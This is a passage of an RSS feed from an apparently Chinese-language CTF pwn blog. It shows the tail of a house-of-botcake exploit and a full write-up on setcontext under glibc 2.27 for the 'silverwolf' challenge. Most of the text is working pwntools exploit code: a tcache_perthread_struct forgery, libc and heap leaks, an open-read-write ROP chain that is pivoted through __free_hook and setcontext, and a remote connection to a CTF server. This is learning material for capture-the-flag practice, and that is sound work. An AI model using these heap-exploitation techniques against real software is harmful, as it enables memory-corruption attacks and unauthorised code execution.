class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(stdout)) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">    pd = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ+<span class="number">8</span>)*<span class="number">2</span></span><br><span class="line">    add(<span class="number">0x80</span>,pd) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    stack = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    lg(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">    ret_addr = stack - <span class="number">0x120</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    pd = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(ret_addr - <span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">    pop_rax = <span class="number">0x0000000000036174</span> + libc_base</span><br><span class="line">    ret = <span class="number">0x0000000000022679</span> + libc_base</span><br><span class="line">    <span class="built_in">open</span> = libc.sym[<span class="string">&quot;open&quot;</span>] + libc_base</span><br><span class="line">    read = libc.sym[<span class="string">&quot;read&quot;</span>] + libc_base</span><br><span class="line">    write = libc.sym[<span class="string">&quot;write&quot;</span>] + libc_base</span><br><span class="line">    puts = libc.sym[<span class="string">&quot;puts&quot;</span>] + libc_base</span><br><span class="line">    flag = ret_addr-<span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    orw = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">    orw += p64(pop_rdi) + p64(flag)</span><br><span class="line">    orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(<span class="built_in">open</span>)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(ret_addr+<span class="number">0x200</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x50</span>)</span><br><span class="line">    orw += p64(read)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># orw += p64(pop_rdi) + p64(1)</span></span><br><span class="line">    <span class="comment"># orw += p64(pop_rsi) + p64(ret_addr+0x200)</span></span><br><span class="line">    <span class="comment"># orw += p64(pop_rdx) + p64(0x30)</span></span><br><span class="line">    <span class="comment"># orw += p64(write)</span></span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(ret_addr+<span class="number">0x200</span>)</span><br><span class="line">    orw += p64(puts)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    add(<span class="number">0x80</span>,orw)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/io-file/">io_file</category>
      
      <category domain="http://example.com/tags/orw/">orw</category>
      
      <category domain="http://example.com/tags/house-of-botcake/">house of botcake</category>
      
      <category domain="http://example.com/tags/environ/">environ</category>
      
      
      <comments>http://example.com/2024/07/17/house-of-botcake/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>初识setcontext</title>
      <link>http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/</link>
      <guid>http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/</guid>
      <pubDate>Tue, 09 Jul 2024 08:35:11 GMT</pubDate>
      
      <description>&lt;p&gt;glibc2.27版本下的setcontext入门&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>glibc2.27版本下的setcontext入门</p><span id="more"></span><p>例题为[CISCN 2021 初赛]silverwolf</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>关于tcache_perthread_struct在堆中是这样的，在有tcache的libc版本中，会生成一个tcache结构体，大小为0x240</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-3.png"></p><p>内容如下，counts代表了各个大小的堆块的数量，entries代表了每个不同大小堆块的链表头</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-4.png"></p><p>从heap_base + 0x10 开始，前0x40个字节分别代表了 0x20-0x410 0x40个不同大小堆块的数量，这也说明了为什么tcache中能存放的最大堆块是0x408</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-5.png"></p><p>比如从heap_base + 0x10的前16个字节，分别代表了0x20到0x110大小的堆块的数量，对应着下图</p><p>从heap_base + 0x10 + 0x40 开始，就是每个堆链的头地址</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-6.png"></p><h5 id="2024-7-15补充"><a href="#2024-7-15补充" class="headerlink" title="2024.7.15补充"></a>2024.7.15补充</h5><p>今天在做题的时候碰到tcache大小0x280的情况，调试后发现，其实就是将上面0x240的tcache结构体表示 不同堆块 的大小的数据结构由 1个字节 变为 2个字节，然后存储heap链表头的地址就变成了 heap_base + 0x10 + 0x80</p><h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><p>在 setcontext+53的地方，通过设置rdi的值，可以修改除了rax外的所有寄存器，但是在glibc2.29开始，rdi变为了rdx，利用会更加困难，这里先留个空，以后再填上</p><p>在本题中，通过将[rdi+0xa0]设置为ROP的起始地址，赋值给rsp，利用ret指令控制rip执行ROP</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-7.png"></p><h3 id="uaf泄露heap基址"><a href="#uaf泄露heap基址" class="headerlink" title="uaf泄露heap基址"></a>uaf泄露heap基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11b0</span></span><br></pre></td></tr></table></figure><h3 id="伪造tcache-perthread-struct"><a href="#伪造tcache-perthread-struct" class="headerlink" title="伪造tcache_perthread_struct"></a>伪造tcache_perthread_struct</h3><p>通过伪造tcache_perthread_struct中堆块的个数，将记录大小为0x240的堆块的个数修改为7，并释放tcache_perthread_struct结构体，使其进入unsortbin泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>) <span class="comment"># 0x240</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000043ae8</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x00000000000d2745</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br></pre></td></tr></table></figure><p>这里学到了一个细节，当用ROPgadget查找syscall指令时，某些地址上的syscall指令的下一条指令并不是ret，而当我们编写的ROP执行了这个syscall指令时，因为没有ret，所以rip并不会返回我们的ROP，所以ROP就没办法继续往下执行，而ROPgadget这个工具没办法查询”syscall ; ret”这种指令</p><p>查找方法：</p><p>在ida中 ALT+B 输入 0f 05 c3 即可查找 syscall ; ret 指令</p><h3 id="orw-ROP"><a href="#orw-ROP" class="headerlink" title="orw ROP"></a>orw ROP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rdi) + p64(flag)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br></pre></td></tr></table></figure><p>这里的话可以把</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br></pre></td></tr></table></figure><p>写成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orw += p64(read)</span><br></pre></td></tr></table></figure><p>read直接用libc查找就可以了，这样可以减少ROP的长度</p><h3 id="布置payload"><a href="#布置payload" class="headerlink" title="布置payload"></a>布置payload</h3><p>pd前40个字节就是各个大小堆块的数量，直接填充0即可，然后就到了堆的链表头，覆盖为如下的地址后即即可实现任意地址写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">flag = heap_base + <span class="number">0x1000</span></span><br><span class="line">stack_1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">stack_2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line">orw_1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">orw_2 = heap_base + <span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">pd += p64(free_hook) <span class="comment"># 0x20</span></span><br><span class="line">pd += p64(flag)      <span class="comment"># 0x30</span></span><br><span class="line">pd += p64(<span class="number">0</span>)         <span class="comment"># 0x40</span></span><br><span class="line">pd += p64(stack_1)   <span class="comment"># 0x50</span></span><br><span class="line">pd += p64(stack_2)   <span class="comment"># 0x60</span></span><br><span class="line">pd += p64(orw_1)     <span class="comment"># 0x70</span></span><br><span class="line">pd += p64(orw_2)     <span class="comment"># 0x80</span></span><br><span class="line"></span><br><span class="line">edit(pd)</span><br></pre></td></tr></table></figure><p>申请0x10大小的堆块，将__free_hook修改为setcontext，往下同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">edit(p64(orw_1)+p64(ret))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p>当free执行后，rdi会指向free的堆块，并执行setcontext，此时rdi的值就是stack_1，而rdi+0xa0 就是 stack_2，执行 setcontext 后，</p><p>就是将stack_2中存储的值赋值给rsp，stack_2中存储着orw_1，此时rsp中就是orw_1,利用ret指令将其赋值给rip，然后rip就开始执行ROP了</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/silverwolf&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc-2.27.so&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x001234)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28997</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11b0</span></span><br><span class="line">    lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">    edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>) <span class="comment"># 0x240</span></span><br><span class="line"></span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">    pop_rax = <span class="number">0x0000000000043ae8</span> + libc_base</span><br><span class="line">    syscall = <span class="number">0x00000000000d2745</span> + libc_base</span><br><span class="line">    ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br><span class="line"></span><br><span class="line">    setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base</span><br><span class="line">    free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">    flag = heap_base + <span class="number">0x1000</span></span><br><span class="line">    stack_1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">    stack_2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line">    orw_1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">    orw_2 = heap_base + <span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">    orw = p64(pop_rdi) + p64(flag)</span><br><span class="line">    orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    pd += p64(free_hook) <span class="comment"># 0x20</span></span><br><span class="line">    pd += p64(flag)      <span class="comment"># 0x30</span></span><br><span class="line">    pd += p64(<span class="number">0</span>)         <span class="comment"># 0x40</span></span><br><span class="line">    pd += p64(stack_1)   <span class="comment"># 0x50</span></span><br><span class="line">    pd += p64(stack_2)   <span class="comment"># 0x60</span></span><br><span class="line">    pd += p64(orw_1)     <span class="comment"># 0x70</span></span><br><span class="line">    pd += p64(orw_2)     <span class="comment"># 0x80</span></span><br><span class="line"></span><br><span class="line">    edit(pd)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x50</span>)</span><br><span class="line">    edit(p64(orw_1)+p64(ret))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>)</span><br><span class="line">    edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>)</span><br><span class="line">    edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    free()</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/setcontext/">setcontext</category>
      
      <category domain="http://example.com/tags/orw/">orw</category>
      
      <category domain="http://example.com/tags/unsortbin-attack/">unsortbin attack</category>
      
      <category domain="http://example.com/tags/tcache-perthread-struct/">tcache_perthread_struct</category>
      
      
      <comments>http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
